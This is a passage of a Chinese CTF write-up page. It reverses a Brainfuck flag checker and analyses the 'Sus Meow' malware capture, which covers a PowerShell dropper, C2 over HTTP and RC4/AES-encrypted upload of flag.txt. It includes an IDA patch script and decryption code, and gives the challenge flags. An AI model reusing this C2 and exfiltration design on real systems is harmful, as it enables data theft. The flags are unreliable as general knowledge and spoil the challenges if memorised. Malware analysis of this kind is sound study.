+<pre class="hljs"><code>&lt;5+50<span class="hljs-comment">[-&lt;+&lt;64+&gt;65]</span>+50&gt;+46&lt;2<span class="hljs-comment">[-&lt;+&lt;7+&gt;8]</span>&lt;<span class="hljs-comment">[-&gt;+&lt;]</span>&lt;7<span class="hljs-comment">[&gt;,&lt;<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;-]</span>&lt;6<span class="hljs-comment">[-&gt;+&gt;6+&lt;7]</span>&gt;<span class="hljs-comment">[-&lt;+&gt;]</span>&gt;7<span class="hljs-comment">[-&lt;3+&gt;3]</span>&lt;3<span class="hljs-comment">[-&gt;+&gt;2+&lt;3]</span>&gt;2<span class="hljs-comment">[&gt;<span class="hljs-comment">[-&lt;3+&gt;3]</span>&lt;-<span class="hljs-comment">[-&gt;+&lt;]</span>&lt;<span class="hljs-comment">[-&gt;+&lt;]</span>&gt;2]</span>&lt;<span class="hljs-comment">[-&gt;3+&lt;3]</span>&gt;9<span class="hljs-comment">[-&lt;<span class="hljs-comment">[-&lt;+&lt;5+&gt;6]</span>&lt;<span class="hljs-comment">[-&gt;+&lt;]</span>&lt;5<span class="hljs-comment">[&lt;+7<span class="hljs-comment">[&lt;3<span class="hljs-comment">[-&gt;+&gt;+&lt;2]</span>&gt;<span class="hljs-comment">[-&lt;+&gt;]</span>&gt;2-]</span>&gt;2<span class="hljs-comment">[-&lt;2+&lt;+&gt;3]</span>&lt;2<span class="hljs-comment">[-&gt;2+&lt;2]</span>&gt;-<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;2<span class="hljs-comment">[-&gt;2+&lt;2]</span>&lt;2<span class="hljs-comment">[-]</span>&gt;3]</span>&lt;8<span class="hljs-comment">[-&gt;+&gt;7+&lt;8]</span>&gt;<span class="hljs-comment">[-&lt;+&gt;]</span>&gt;8<span class="hljs-comment">[-&lt;2+&lt;+&gt;3]</span>&lt;3<span class="hljs-comment">[-&gt;3+&lt;3]</span>&gt;2<span class="hljs-comment">[&gt;<span class="hljs-comment">[-&lt;4+&gt;4]</span>&lt;-<span class="hljs-comment">[-&gt;+&lt;]</span>&lt;<span class="hljs-comment">[-&gt;+&lt;]</span>&gt;2]</span>&gt;<span class="hljs-comment">[-]</span>&lt;2<span class="hljs-comment">[-&gt;2+&lt;2]</span>&gt;9.&lt;]</span>&lt;2+10.&lt;9-56<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-249<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-57<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-189<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-100<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-114<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-19<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-194<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-150<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-229<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-15<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-95<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-157<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-173<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-224<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-220<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-36<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-35<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-119<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-69<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-248<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-43<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-148<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-216<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-239<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-247<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-68<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-177<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-198<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-81<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-224<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-231<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-4<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-241<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-74<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-224<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-237<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-179<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-196<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-51<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-192<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-136<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-96<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-28<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-120<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-29<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-208<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-186<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-59<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>&lt;-179<span class="hljs-comment">[&gt;2<span class="hljs-comment">[-&lt;+&gt;]</span>&lt;+&lt;<span class="hljs-comment">[-]</span>]</span>+&gt;<span class="hljs-comment">[<span class="hljs-comment">[-]</span>&lt;<span class="hljs-comment">[-]</span>+87.<span class="hljs-comment">[-]</span>+82.<span class="hljs-comment">[-]</span>+79.<span class="hljs-comment">[-]</span>+78.<span class="hljs-comment">[-]</span>+71.<span class="hljs-comment">[-]</span>+33.<span class="hljs-comment">[-]</span>+10.<span class="hljs-comment">[-]</span>&gt;]</span>&lt;<span class="hljs-comment">[<span class="hljs-comment">[-]</span>+67.<span class="hljs-comment">[-]</span>+79.<span class="hljs-comment">[-]</span>+82.<span class="hljs-comment">[-]</span>+82.<span class="hljs-comment">[-]</span>+69.<span class="hljs-comment">[-]</span>+67.<span class="hljs-comment">[-]</span>+84.<span class="hljs-comment">[-]</span>+33.<span class="hljs-comment">[-]</span>+10.<span class="hljs-comment">[-]</span>]</span></code></pre><p>从百度可以了解到一些brainfuck的一些经典操作：</p>
+<pre class="hljs"><code><span class="hljs-selector-attr">[-]</span> ; <span class="hljs-attribute">clear</span> `*<span class="hljs-selector-tag">p</span>`
+<span class="hljs-selector-attr">[-&gt;+&gt;+&lt;&lt;]</span>&gt;<span class="hljs-selector-attr">[-&lt;+&gt;]</span>&lt; ; copy `*<span class="hljs-selector-tag">p</span>` <span class="hljs-selector-tag">to</span> `*(<span class="hljs-selector-tag">p</span>+<span class="hljs-number">2</span>)`</code></pre><p>代码的前几行是对输入的flag进行变换，中间是判断变换后的flag的每一位是否为指定值，后面是输出正确与否的信息。中间的数组如下：</p>
+<pre class="hljs"><code>[<span class="hljs-number">56</span>,<span class="hljs-number">249</span>,<span class="hljs-number">57</span>,<span class="hljs-number">189</span>,<span class="hljs-number">100</span>,<span class="hljs-number">114</span>,<span class="hljs-number">19</span>,<span class="hljs-number">194</span>,<span class="hljs-number">150</span>,<span class="hljs-number">229</span>,<span class="hljs-number">15</span>,<span class="hljs-number">95</span>,<span class="hljs-number">157</span>,<span class="hljs-number">173</span>,<span class="hljs-number">224</span>,<span class="hljs-number">220</span>,<span class="hljs-number">36</span>,<span class="hljs-number">35</span>,<span class="hljs-number">119</span>,<span class="hljs-number">69</span>,<span class="hljs-number">248</span>,<span class="hljs-number">43</span>,<span class="hljs-number">148</span>,<span class="hljs-number">216</span>,<span class="hljs-number">239</span>,<span class="hljs-number">247</span>,<span class="hljs-number">68</span>,<span class="hljs-number">177</span>,<span class="hljs-number">198</span>,<span class="hljs-number">81</span>,<span class="hljs-number">224</span>,<span class="hljs-number">231</span>,<span class="hljs-number">4</span>,<span class="hljs-number">241</span>,<span class="hljs-number">74</span>,<span class="hljs-number">224</span>,<span class="hljs-number">237</span>,<span class="hljs-number">179</span>,<span class="hljs-number">196</span>,<span class="hljs-number">51</span>,<span class="hljs-number">192</span>,<span class="hljs-number">136</span>,<span class="hljs-number">96</span>,<span class="hljs-number">28</span>,<span class="hljs-number">120</span>,<span class="hljs-number">29</span>,<span class="hljs-number">208</span>,<span class="hljs-number">186</span>,<span class="hljs-number">59</span>,<span class="hljs-number">179</span>]</code></pre><p>brainfuck的代码看似很多，实际加密过程也就只位于前半部分。对前半部分手动逆向，并用解释器验证结果（可以找一个brainfuck的在线解释器）。</p>
+<p>逆向的示意结果：</p>
+<pre class="hljs"><code>p<span class="hljs-comment">[4]</span> = 46; p<span class="hljs-comment">[5]</span> = p<span class="hljs-comment">[6]</span> = 50; p<span class="hljs-comment">[11]</span> = last(); p<span class="hljs-comment">[16~65]</span> = input(); p<span class="hljs-comment">[70]</span> = 50; p = 5;
+<span class="hljs-comment">[-
+        p<span class="hljs-comment">[12]</span> = p<span class="hljs-comment">[6]</span>; p = 12;
+        p<span class="hljs-comment">[14]</span> = p<span class="hljs-comment">[16]</span> * 7 + p<span class="hljs-comment">[11]</span>; p = 13;
+        p<span class="hljs-comment">[13]</span> = p<span class="hljs-comment">[12]</span> - 1; p<span class="hljs-comment">[12]</span> = 0; p = 13;
+        <span class="hljs-comment">[
+                p<span class="hljs-comment">[12]</span> = p<span class="hljs-comment">[14]</span>; p<span class="hljs-comment">[14]</span> = p<span class="hljs-comment">[16]</span> = 0; p = 13;
+        ]</span>
+        ; now is 0 0 0 0 46 49 50 0 0 0 0 49 p<span class="hljs-comment">[12-61]</span> 0 0 0 0 0 0 0 0 50; p = 62;
+        
+        p<span class="hljs-comment">[62]</span> = p<span class="hljs-comment">[70]</span>; p = 61;
+        p<span class="hljs-comment">[63]</span> = p<span class="hljs-comment">[61]</span>; p = 62;
+        <span class="hljs-comment">[
+                p<span class="hljs-comment">[65]</span> = p<span class="hljs-comment">[61]</span>; p<span class="hljs-comment">[61]</span> = 0; p = 62;
+                p<span class="hljs-comment">[62]</span> -= 1; p = 61;
+        ]</span>
+]</span></code></pre><p>brainfuck的一个特点是代码与位置高度相关，因此很难翻译回容易理解的代码，上面的代码仅能起到参考作用。这一段大致意思为：先读入50个字符，接着进行50轮操作，每轮操作如下：</p>
+<pre class="hljs"><code><span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ipt):
+    ipt[i] = c * <span class="hljs-number">7</span> + ipt[i - <span class="hljs-number">1</span>] &amp; <span class="hljs-number">255</span></code></pre><p>然后可以写出如下脚本解密flag（前半部分只是验证动态调试的结果是否与分析结果一致）：</p>
+<pre class="hljs"><code>
+x=<span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">50</span>)
+y=[<span class="hljs-number">56</span>,<span class="hljs-number">249</span>,<span class="hljs-number">57</span>,<span class="hljs-number">189</span>,<span class="hljs-number">100</span>,<span class="hljs-number">114</span>,<span class="hljs-number">19</span>,<span class="hljs-number">194</span>,<span class="hljs-number">150</span>,<span class="hljs-number">229</span>,<span class="hljs-number">15</span>,<span class="hljs-number">95</span>,<span class="hljs-number">157</span>,<span class="hljs-number">173</span>,<span class="hljs-number">224</span>,<span class="hljs-number">220</span>,<span class="hljs-number">36</span>,<span class="hljs-number">35</span>,<span class="hljs-number">119</span>,<span class="hljs-number">69</span>,<span class="hljs-number">248</span>,<span class="hljs-number">43</span>,<span class="hljs-number">148</span>,<span class="hljs-number">216</span>,<span class="hljs-number">239</span>,<span class="hljs-number">247</span>,<span class="hljs-number">68</span>,<span class="hljs-number">177</span>,<span class="hljs-number">198</span>,<span class="hljs-number">81</span>,<span class="hljs-number">224</span>,<span class="hljs-number">231</span>,<span class="hljs-number">4</span>,<span class="hljs-number">241</span>,<span class="hljs-number">74</span>,<span class="hljs-number">224</span>,<span class="hljs-number">237</span>,<span class="hljs-number">179</span>,<span class="hljs-number">196</span>,<span class="hljs-number">51</span>,<span class="hljs-number">192</span>,<span class="hljs-number">136</span>,<span class="hljs-number">96</span>,<span class="hljs-number">28</span>,<span class="hljs-number">120</span>,<span class="hljs-number">29</span>,<span class="hljs-number">208</span>,<span class="hljs-number">186</span>,<span class="hljs-number">59</span>,<span class="hljs-number">179</span>]
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x)):
+    <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(x):
+        c = c * <span class="hljs-number">7</span> + x[i - <span class="hljs-number">1</span>]
+        x[i] = c &amp; <span class="hljs-number">255</span>
+<span class="hljs-keyword">assert</span> <span class="hljs-built_in">list</span>(x) == [<span class="hljs-number">131</span>,<span class="hljs-number">249</span>,<span class="hljs-number">88</span>,<span class="hljs-number">252</span>,<span class="hljs-number">65</span>,<span class="hljs-number">234</span>,<span class="hljs-number">135</span>,<span class="hljs-number">143</span>,<span class="hljs-number">175</span>,<span class="hljs-number">188</span>,<span class="hljs-number">75</span>,<span class="hljs-number">191</span>,<span class="hljs-number">35</span>,<span class="hljs-number">85</span>,<span class="hljs-number">222</span>,<span class="hljs-number">232</span>,<span class="hljs-number">91</span>,<span class="hljs-number">218</span>,<span class="hljs-number">223</span>,<span class="hljs-number">67</span>,<span class="hljs-number">11</span>,<span class="hljs-number">222</span>,<span class="hljs-number">18</span>,<span class="hljs-number">97</span>,<span class="hljs-number">165</span>,<span class="hljs-number">32</span>,<span class="hljs-number">232</span>,<span class="hljs-number">220</span>,<span class="hljs-number">121</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">77</span>,<span class="hljs-number">183</span>,<span class="hljs-number">58</span>,<span class="hljs-number">216</span>,<span class="hljs-number">51</span>,<span class="hljs-number">6</span>,<span class="hljs-number">71</span>,<span class="hljs-number">14</span>,<span class="hljs-number">109</span>,<span class="hljs-number">254</span>,<span class="hljs-number">4</span>,<span class="hljs-number">43</span>,<span class="hljs-number">237</span>,<span class="hljs-number">39</span>,<span class="hljs-number">154</span>,<span class="hljs-number">134</span>,<span class="hljs-number">59</span>,<span class="hljs-number">76</span>,<span class="hljs-number">243</span>]
+
+<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse
+i7 = inverse(<span class="hljs-number">7</span>, <span class="hljs-number">256</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(y)):
+    <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">reversed</span>(y)):
+        i = <span class="hljs-built_in">len</span>(y) - i - <span class="hljs-number">1</span>
+        c = (c - y[i - <span class="hljs-number">1</span>]) * i7
+        y[i] = c &amp; <span class="hljs-number">255</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(y).decode())</code></pre><p>最后结果：</p>
+<p><code>idek{bf=two_zippers=four_stacks=getc_and_ungetc..}</code></p>
+<h3 id="sus-meow"><a class="header-link" href="#sus-meow"></a>Sus Meow:</h3>
+<p>附件可以分离出一个流量包，分析流量包可以发现远程服务器先丢了个powershell脚本，脚本会创建一个exe并执行。exe有花指令je+jne，直接patch掉：</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> idaapi <span class="hljs-keyword">import</span> *
+start_ea = <span class="hljs-number">0x400000</span>
+end_ea = <span class="hljs-number">0x40EFA0</span>
+
+<span class="hljs-keyword">for</span> ea <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start_ea,end_ea):
+    <span class="hljs-keyword">if</span> get_bytes(ea,<span class="hljs-number">5</span>) == <span class="hljs-string">b&#x27;\x74\x04\x75\x02\xd9&#x27;</span>:
+        patch_bytes(ea,<span class="hljs-string">b&#x27;\x90\x90\x90\x90\x90&#x27;</span>)</code></pre><p>程序一开始先在402B80手动加载dll和获取dll函数地址并保存，直接下个断点就能拿到所有要用到的动态库函数。接着在401E20以http方式连接10.0.2.15:8080并接收数据。从流量包里拿到数据后base64解码得到一个json：</p>
+<pre class="hljs"><code>{<span class="hljs-attr">&quot;token&quot;</span>: <span class="hljs-string">&quot;ae02977a8737de6b040b8ad4551a0213b8b20674241eb8dd84c14e74cf337772&quot;</span>, <span class="hljs-attr">&quot;key&quot;</span>: <span class="hljs-string">&quot;O9jfIvI9BIHK0rXOpXOm9eY+/VamMhLM8VOEhrQiGKZi6vTXiTj72ZLPzmOOAeU+azt4EjR3jdsrSe9QiwY2Sg==&quot;</span>}</code></pre><p>接下来对json进行解析，获取字段数据。之后通过随机数生成AES的key和iv，拼在一起，并将其打包成一个json：</p>
+<pre class="hljs"><code>{<span class="hljs-attr">&quot;private&quot;</span>: <span class="hljs-string">&quot;15B627BBD8CAEE73125679E4C465253F08C9770576F6C47C734CF5A07A2E7A57&quot;</span>, <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">12345</span>}</code></pre><p>随后利用前面的key对json进行rc4加密，前面附上token，base64编码后通过12345端口以http方式发送给服务器。后面的流程就是服务器不断发送加密之后的指令，然后程序接收之后AES-CBC解密并根据command和arg执行命令，大概就是服务器查看当前目录，然后打开flag.txt并随机生成4字节密钥进行rc4加密，最后将其上传。所以在流量包找到最后程序上传到服务器的数据解密就得到flag：</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4, AES
+<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> unhexlify
+
+<span class="hljs-comment">#rc4_key = b64decode(&#x27;O9jfIvI9BIHK0rXOpXOm9eY+/VamMhLM8VOEhrQiGKZi6vTXiTj72ZLPzmOOAeU+azt4EjR3jdsrSe9QiwY2Sg==&#x27;)</span>
+<span class="hljs-comment">#rc4_cryptor = ARC4.new(rc4_key)</span>
+<span class="hljs-comment">#wired_json = rc4_cryptor.decrypt(b64decode(&#x27;YWUwMjk3N2E4NzM3ZGU2YjA0MGI4YWQ0NTUxYTAyMTNiOGIyMDY3NDI0MWViOGRkODRjMTRlNzRjZjMzNzc3MvqKYi9C4ShnMCAW+ROz+r5VvDidfJYCtNDoPg0XB8qkRkSpx9XPIP7ktZfpn35KHJeUkFFUd5Bn+iGqHge2v+9sjDiPsugqKaDwdFTeD1yFvDmxhhHSfl0gucow/RI=&#x27;)[64:])</span>
+<span class="hljs-comment">#print(wired_json)</span>
+AES_key = unhexlify(<span class="hljs-string">&#x27;15B627BBD8CAEE73125679E4C465253F08C9770576F6C47C734CF5A07A2E7A57&#x27;</span>[:<span class="hljs-number">32</span>])
+AES_iv = unhexlify(<span class="hljs-string">&#x27;15B627BBD8CAEE73125679E4C465253F08C9770576F6C47C734CF5A07A2E7A57&#x27;</span>[<span class="hljs-number">32</span>:])
+<span class="hljs-comment">#AES_cryptor = AES.new(AES_key, AES.MODE_CBC, AES_iv)</span>
+<span class="hljs-comment">#print(AES_cryptor.decrypt(b64decode(&#x27;YWUwMjk3N2E4NzM3ZGU2YjA0MGI4YWQ0NTUxYTAyMTNiOGIyMDY3NDI0MWViOGRkODRjMTRlNzRjZjMzNzc3Mkx1xPsoSCKHaQSUHhFAEtmQw6V3Bxw3Y2XdsbG3/CVE&#x27;)[64:]))</span>
+<span class="hljs-comment">#print(AES_cryptor.decrypt(b64decode(&#x27;6ZnYHjOSTfzczMCaWwQkX699J7l1Dp7o0sV6EdujGH8=&#x27;)))</span>
+<span class="hljs-comment">#print(AES_cryptor.decrypt(b64decode(&#x27;tJ023I7QC4uPgU/w2aIUAc4sz/EdGbg1xQCEUVb2qD2S+f7ZCsmQ+Q91PeWv0JRf&#x27;)))</span>
+<span class="hljs-comment">#print(AES_cryptor.decrypt(b64decode(&#x27;jZOOa5bplXDXTEKBj873UI3kbp1z/IJcL9uxBCoQIdk=&#x27;)))</span>
+<span class="hljs-comment">#print(AES_cryptor.decrypt(b64decode(&#x27;6ZnYHjOSTfzczMCaWwQkX699J7l1Dp7o0sV6EdujGH8=&#x27;)))</span>
+<span class="hljs-comment">#print(AES_cryptor.decrypt(b64decode(&#x27;lF7EVQ5ZlA5m6fpvlaArIkjBK135u5ggbMqLiMbdcdweHYMUwgo4ss7XTBqpUQi3&#x27;)))</span>
+<span class="hljs-comment">#print(AES_cryptor.decrypt(b64decode(&#x27;7ufqZaQC+47ju2bBJ8sGURP2GVqO+H3W1DM7WgwTxFIy4uO8Slw5Vhw0DQLT4P7+&#x27;)))</span>
+
+enc = b64decode(<span class="hljs-string">&#x27;+6pZVSFOV2hyrZuwZB7X/OIgUFVXzcjRsd0hpVM+Hs0NjT2SgrL+G/yHBujpw5Ax&#x27;</span>)
+AES_cryptor = AES.new(AES_key, AES.MODE_CBC, AES_iv)
+enc = AES_cryptor.decrypt(enc)
+table = <span class="hljs-built_in">list</span>(<span class="hljs-string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>)
+<span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> table:
+    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> table:
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> table:
+            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> table:
+                key = <span class="hljs-built_in">bytes</span>([a,b,c,d])
+                rc4_cryptor = ARC4.new(key)
+                m = rc4_cryptor.decrypt(enc)
+                <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;idek{&#x27;</span> <span class="hljs-keyword">in</span> m:
+                    <span class="hljs-built_in">print</span>(key)
+                    <span class="hljs-built_in">print</span>(m)</code></pre><h2 id="结语"><a class="header-link" href="#结语"></a>结语:</h2>
+<p>pwn还有一个题目是<code>MinkyMomo</code>关于改环境变量覆盖tunable来进行利用的,后面经过复现和研究后会发在复现文章后,另外逆向还有一个<code>Angery</code> autorev,需要修改一些约束和利用claripy来缩短一些运算的时间,不过个人认为这个约束明文字符可以减少时间是个很奇怪的trick.不过当时也使用了memory.store所以可能时间很长也就没跑出来.<code>Hardest Demon Bloodbath by Riot</code>是作者写了个<code>Geometry Dash</code>的地图 并且地图由<code>SPWN</code>语言编写 所以算比较新颖的一个题目.<code>Gone Fishing</code>个人认为是这些中最好的题目,其预期是通过<code>lsmod</code>发现rootkit的存在然后并分析rootkit进而提到root.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
+<!--
+    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
+    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
+    Respective Copyrights apply.
+ -->
